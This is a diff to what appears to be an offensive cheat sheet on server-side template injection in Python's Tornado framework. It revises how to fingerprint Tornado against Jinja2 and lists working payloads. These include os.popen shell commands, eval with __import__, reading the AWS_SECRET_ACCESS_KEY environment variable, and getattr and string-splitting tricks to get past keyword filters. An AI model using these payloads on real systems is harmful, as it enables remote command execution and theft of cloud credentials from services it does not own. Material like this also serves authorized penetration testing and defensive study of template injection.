@@ -32,7 +32,7 @@ Success indicator: `id` output (uid/gid line) in the response, or `os.system` re
 
 ## Where this engine lives
 
-- **Tornado web framework** - Python async web server. Templates are rendered with `tornado.template.Template(...).generate()` or a `RequestHandler`'s `render()` / `render_string()`. The SSTI sink is any of those called on user input.
+- **Tornado web framework** - Python async web server. SSTI happens when attacker input becomes part of the *template source* that gets compiled - most directly `tornado.template.Template(user_input).generate(...)`, or any code that concatenates user input into a template string before rendering. Note the distinction: a `RequestHandler`'s `render(name)` / `render_string(name)` take a template *filename*, so controlling only that argument is template-file selection / path traversal, not SSTI - the input has to reach the template *body* for expressions to evaluate.
 - **Standalone `tornado.template`** - the template module is sometimes embedded outside the web framework (email builders, code generators) because it's dependency-light.
 - **Legacy Python stacks** - Tornado predates ASGI and lingers in older Python services and internal tooling.
 
@@ -53,7 +53,11 @@ Neither of these separates Tornado from Jinja2 - both are Python, both repeat th
 # Jinja2-specific - 500 / error on Tornado
 {{config}}                       # Jinja2: dumps Flask config.  Tornado: error
 {{self}}                         # Jinja2: runtime Context.     Tornado: error
-{{ ''.__class__.__mro__[1].__subclasses__() }}   # Jinja2: works.  Tornado: error (no bare '' attr walk in expr context the same way)
+
+# NOT a distinguisher: the subclass walk evaluates in BOTH (both are unsandboxed
+# Python), so a result here only tells you "Python family", not which engine:
+#   {{ ''.__class__.__mro__[1].__subclasses__() }}
+# Use the {% import %} statement below to split Tornado from Jinja2.
 
 # Tornado-specific - evaluates on Tornado, errors on Jinja2
 {% import os %}{{ os.getcwd() }}         # Tornado: cwd string.  Jinja2: error (its {% import %} is for templates, not modules)
@@ -127,16 +131,24 @@ Prefer `os.popen(...).read()` - `os.system` returns the exit status (you see `0`
 {{ os.popen('ls -la /').read() }}
 ```
 
-### `exec` / `eval` for arbitrary Python
+### Arbitrary Python via builtins
 
-When you want full Python rather than shelling out:
+When you want full Python rather than shelling out, the `eval`/`exec` builtins are in template scope:
 
 ```
+{{ eval("__import__('os').popen('id').read()") }}
 {% import os %}{{ os.getenv('AWS_SECRET_ACCESS_KEY') }}
-{% raw %}{% import os %}{% end %}            # note: Tornado uses {% end %}, not {% endfor %}/{% endif %}
 ```
 
-Tornado closes every block with `{% end %}` (not `{% endfor %}` / `{% endif %}` as Jinja2 does) - a useful secondary fingerprint and necessary when your payload needs a loop or conditional.
+### The `{% end %}` fingerprint
+
+Tornado closes **every** control block with `{% end %}` - not `{% endfor %}` / `{% endif %}` as Jinja2 does. It matters when a payload needs a loop or conditional, and it is a clean secondary fingerprint:
+
+```
+{% for i in [1, 2, 3] %}{{ i }}{% end %}     # Tornado → '123';  Jinja2 → error (expects {% endfor %})
+```
+
+(`{% raw expression %}` outputs an expression without autoescaping and does **not** open a block, so it needs no `{% end %}` - don't pair the two.)
 
 ## File read without command execution
 
@@ -186,9 +198,14 @@ When keywords (`import`, `os`, `system`, `popen`) are blocked, see [filter bypas
 # getattr chain avoids a literal 'popen'
 {{ getattr(__import__('os'), 'pop'+'en')('id').read() }}
 
-# string concatenation to dodge a literal 'os' / 'system' match
+# dodge a literal command-string filter (e.g. 'id' blocked) - split the command
 {% import os %}{{ os.popen('i'+'d').read() }}
-{{ __import__('o'+'s').system('id') }}
+
+# dodge a literal 'os' filter - split the module name
+{{ __import__('o'+'s').popen('id').read() }}
+
+# dodge a literal 'system' filter - build the attribute name
+{{ getattr(__import__('os'), 'sys'+'tem')('id') }}
 ```
 
 Because template scope is raw Python, any filter-bypass that works in a Python `eval` sink works here - string building, `getattr`, `chr()`-assembled names, hex-escaped identifiers.
